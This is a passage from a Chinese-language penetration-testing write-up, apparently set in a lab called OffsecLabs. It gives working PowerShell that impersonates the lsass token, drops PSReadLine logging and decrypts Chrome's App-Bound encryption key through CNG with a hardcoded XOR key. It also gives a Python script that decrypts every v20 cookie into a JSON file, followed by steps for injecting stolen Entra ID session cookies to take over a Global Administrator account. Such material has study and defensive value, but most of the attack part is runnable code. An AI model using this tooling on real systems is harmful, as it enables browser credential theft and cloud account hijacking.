            if (hToken != IntPtr.Zero) CloseHandle(hToken);
            if (dupeToken != IntPtr.Zero) CloseHandle(dupeToken);
        }
    }
}
"@

function Invoke-ByteXor {
    param([byte[]]$Bytes1, [byte[]]$Bytes2)
    
    $result = [byte[]]::new($Bytes1.Length)
    for ($i = 0; $i -lt $Bytes1.Length; $i++) {
        $result[$i] = $Bytes1[$i] -bxor $Bytes2[$i]
    }
    return $result
}

function Get-DecryptedAesKey {
    param([string]$EncryptedKeyHex = "34d7b92748af91d1ad920bbf9179094d40f2af73ecfc23716f080da213e3e43d")
    
    Write-Host "[*] Converting encrypted key hex to bytes"
    $encryptedKeyBytes = for ($i = 0; $i -lt $EncryptedKeyHex.Length; $i += 2) {
        [Convert]::ToByte($EncryptedKeyHex.Substring($i, 2), 16)
    }
    Write-Host "[+] Encrypted key size: $($encryptedKeyBytes.Length) bytes"
    
    # Open storage provider
    Write-Host "[*] NCryptOpenStorageProvider: Opening Microsoft Software Key Storage Provider"
    $providerHandle = [IntPtr]::Zero
    $result = [SecurityInterop]::NCryptOpenStorageProvider([ref]$providerHandle, "Microsoft Software Key Storage Provider", 0)
    if ($result -ne 0) { throw "NCryptOpenStorageProvider failed: $result" }
    Write-Host "[+] NCryptOpenStorageProvider: Storage provider opened"
    
    try {
        # Open Chrome key
        Write-Host "[*] NCryptOpenKey: Opening Chrome encryption key"
        $keyHandle = [IntPtr]::Zero
        $result = [SecurityInterop]::NCryptOpenKey($providerHandle, [ref]$keyHandle, "Google Chromekey1", 0, 0)
        if ($result -ne 0) { throw "NCryptOpenKey failed: $result" }
        Write-Host "[+] NCryptOpenKey: Chrome key opened"
        
        try {
            # Get output size
            Write-Host "[*] NCryptDecrypt: Getting output buffer size"
            $outputSize = 0
            $result = [SecurityInterop]::NCryptDecrypt($keyHandle, $encryptedKeyBytes, $encryptedKeyBytes.Length, [IntPtr]::Zero, $null, 0, [ref]$outputSize, [SecurityInterop]::NCRYPT_SILENT_FLAG)
            if ($result -ne 0) { throw "NCryptDecrypt (size query) failed: $result" }
            Write-Host "[+] NCryptDecrypt: Output buffer size: $outputSize bytes"
            
            # Decrypt to get intermediate decrypted AES key
            Write-Host "[*] NCryptDecrypt: Decrypting to obtain intermediate decrypted AES key"
            $outputBuffer = [byte[]]::new($outputSize)
            $result = [SecurityInterop]::NCryptDecrypt($keyHandle, $encryptedKeyBytes, $encryptedKeyBytes.Length, [IntPtr]::Zero, $outputBuffer, $outputBuffer.Length, [ref]$outputSize, [SecurityInterop]::NCRYPT_SILENT_FLAG)
            if ($result -ne 0) { throw "NCryptDecrypt failed: $result" }
            
            $intermediateAesKey = $outputBuffer[0..($outputSize - 1)]
            $intermediateHex = -join ($intermediateAesKey | ForEach-Object { $_.ToString("x2") })
            Write-Host "[+] NCryptDecrypt: Intermediate decrypted AES key obtained"
            Write-Host "[*] Intermediate decrypted key (hex): $intermediateHex"
            Write-Host "[*] Intermediate decrypted key length: $($intermediateAesKey.Length) bytes"
            
            # Apply XOR to get final decrypted AES key
            Write-Host "[*] XOR: Applying XOR operation for final decrypted AES key"
            $xorKey = [byte[]]@(0xCC, 0xF8, 0xA1, 0xCE, 0xC5, 0x66, 0x05, 0xB8, 0x51, 0x75, 0x52, 0xBA, 0x1A, 0x2D, 0x06, 0x1C, 0x03, 0xA2, 0x9E, 0x90, 0x27, 0x4F, 0xB2, 0xFC, 0xF5, 0x9B, 0xA4, 0xB7, 0x5C, 0x39, 0x23, 0x90)
            
            $finalAesKey = Invoke-ByteXor -Bytes1 $intermediateAesKey -Bytes2 $xorKey
            $finalHex = -join ($finalAesKey | ForEach-Object { $_.ToString("x2") })
            Write-Host "[+] XOR: Final decrypted AES key derivation successful"
            Write-Host "[+] Final decrypted AES key (hex): $finalHex" -ForegroundColor Yellow
            Write-Host "[+] Final decrypted AES key length: $($finalAesKey.Length) bytes"
            
            return $finalAesKey
        }
        finally {
            if ($keyHandle -ne [IntPtr]::Zero) {
                [SecurityInterop]::NCryptFreeObject($keyHandle) | Out-Null
                Write-Host "[*] NCryptFreeObject: Key handle released"
            }
        }
    }
    finally {
        if ($providerHandle -ne [IntPtr]::Zero) {
            [SecurityInterop]::NCryptFreeObject($providerHandle) | Out-Null
            Write-Host "[*] NCryptFreeObject: Provider handle released"
        }
    }
}

# Main execution
Write-Host "`n=================================================="
Write-Host "CHROME AES KEY DECRYPTION VIA CNG WITH XOR"
Write-Host "==================================================`n"

Write-Host "[*] Remove-Module: Removing PSReadLine"
Remove-Module PSReadLine -Force -ErrorAction SilentlyContinue
Write-Host "[+] Remove-Module: PSReadLine removed"

Write-Host "[*] ImpersonateProcessToken: Impersonating lsass process token"
if (-not [SecurityInterop]::ImpersonateProcessToken("lsass")) {
    Write-Host "[-] ImpersonateProcessToken: Impersonation failed"
    exit 1
}
Write-Host "[+] ImpersonateProcessToken: Process token impersonation successful"
Write-Host "[*] Current security context: $([Security.Principal.WindowsIdentity]::GetCurrent().Name)"

Write-Host "[*] Starting AES key decryption process"
try {
    if ($args.Count -gt 0) {
        $finalKey = Get-DecryptedAesKey -EncryptedKeyHex $args[0]
    } else {
        $finalKey = Get-DecryptedAesKey
    }
    Write-Host "[+] AES key decryption completed successfully`n"
}
catch {
    Write-Host "[-] Error: $($_.Exception.Message)`n" -ForegroundColor Red
}
```

![image-20250930160009083.png](images/img_19124_018.png)

（8）最后，编写以下 Python 脚本，将上一步获取到的 `aes_key` 的值作为密钥，通过 `AES-256-GCM` 的算法对 CIPHERTEXT 部分进行解密（还需要用到 VI 和 TAG 部分），得到最终用来解密 Cookies 的 “App‑Bound Key”。接着，读取 `Cookies` 数据库文件中的 Cookies 并使用 “App-Bound Key” 进行解密。

```
import sqlite3
import json
from Crypto.Cipher import AES
from datetime import datetime

def decrypt_app_bound_encrypted_key(aes_key):
    iv = bytes.fromhex("397e15a37a6dbbcfee2f05db")
    ciphertext = bytes.fromhex("88b648b69cd84b0450824938ebbc8c163b3889bd7f4424aac250e8f78c65fd7b")
    tag = bytes.fromhex("c83481cc61711bee16cca9c409bf6f73")

    cipher = AES.new(aes_key, AES.MODE_GCM, nonce=iv)
    return cipher.decrypt_and_verify(ciphertext, tag)

def decrypt_v20_cookie(encrypted_value, key):
    cookie_iv = encrypted_value[3:15]
    encrypted_cookie = encrypted_value[15:-16]
    cookie_tag = encrypted_value[-16:]

    cipher = AES.new(key, AES.MODE_GCM, nonce=cookie_iv)
    decrypted_cookie = cipher.decrypt_and_verify(encrypted_cookie, cookie_tag)
    return decrypted_cookie[32:].decode('utf-8')

def fetch_cookies(db_path):
    conn = sqlite3.connect(db_path, uri=True)
    cursor = conn.cursor()

    cursor.execute("""
        SELECT creation_utc, host_key, name, encrypted_value, 
               expires_utc, last_access_utc, last_update_utc,
               is_secure, is_httponly
        FROM cookies
    """)

    cookies = [row for row in cursor.fetchall() if row[3][:3] == b"v20"]
    conn.close()
    return cookies

def chrome_time_to_iso(timestamp):
    if timestamp == 0:
        return None
    try:
        epoch_start = datetime(1601, 1, 1)
        delta = datetime.fromtimestamp(timestamp / 1000000) - datetime.fromtimestamp(0) + epoch_start - datetime(1970,
                                                                                                                 1, 1)
        return (epoch_start + delta).isoformat()
    except:
        return None

def main():
    aes_key = bytes.fromhex("b69836de7714d79f38c7c53f2376f6b063a57958853a1b93cb58857ec902eab0")
    app_bound_decrypted_key = decrypt_app_bound_encrypted_key(aes_key)
    print(f"[+] Decrypted app_bound_key: {app_bound_decrypted_key.hex()}")

    cookies = fetch_cookies("Cookies")
    print(f"[*] Found {len(cookies)} v20 cookies")

    result = {
        "metadata": {
            "total": len(cookies),
            "extraction_time": datetime.now().isoformat(),
            "successful": 0,
            "failed": 0
        },
        "cookies": []
    }

    for cookie in cookies:
        (creation_utc, host_key, name, encrypted_value, expires_utc,
         last_access_utc, last_update_utc, is_secure, is_httponly) = cookie

        cookie_data = {
            "host": host_key,
            "name": name,
            "is_secure": bool(is_secure),
            "is_httponly": bool(is_httponly),
            "created": chrome_time_to_iso(creation_utc),
            "expires": chrome_time_to_iso(expires_utc),
            "last_accessed": chrome_time_to_iso(last_access_utc),
            "last_updated": chrome_time_to_iso(last_update_utc)
        }

        try:
            cookie_data["value"] = decrypt_v20_cookie(encrypted_value, app_bound_decrypted_key)
            cookie_data["status"] = "success"
            result["metadata"]["successful"] += 1
        except Exception as e:
            cookie_data["value"] = None
            cookie_data["status"] = "failed"
            cookie_data["error"] = str(e)
            result["metadata"]["failed"] += 1

        result["cookies"].append(cookie_data)

    with open("cookies.json", "w", encoding="utf-8") as f:
        json.dump(result, f, indent=2, ensure_ascii=False)

    print(
        f"[+] Saved {result['metadata']['successful']} successful, {result['metadata']['failed']} failed to cookies.json")

if __name__ == "__main__":
    main()
```

解密完成的 Cookies 会以 JSON 格式保存在 cookies.json 文件中，如下图所示：

![image-20250930171603487.png](images/img_19124_019.png)

在本案例中，为登录 OffsecLabs 组织的 Microsoft Entra ID，我们重点关注的认证 Cookie 包括 ESTSAUTH、ESTSAUTHPERSISTENT 与 ESTSAUTHLIGHT，这些 Cookie 表明对应用户最近在其 Azure 云资产上有过活动。

因此，只需访问 login.microsoftonline.com 并注入 ESTSAUTHPERSISTENT 或 ESTSAUTH 等认证 Cookie，即可完成会话恢复并获得对目标会话的身份验证。如下图所示，最终成功以 Global Administrator 身份接管其 Microsoft Entra ID。

![Animation.gif](images/img_19124_020.png)

# References

* <https://medium.com/@toneillcodes/extracting-dpapi-masterkey-data-1381168ad5b8>
* <https://learn.microsoft.com/en-us/previous-versions/ms995355(v=msdn.10)>
* <https://specterops.io/blog/2025/08/27/dough-no-revisiting-cookie-theft/?utm_source=chatgpt.com>
* <https://github.com/runassu/chrome_v20_decryption>
* <https://gist.github.com/thewh1teagle/d0bbc6bc678812e39cba74e1d407e5c7>
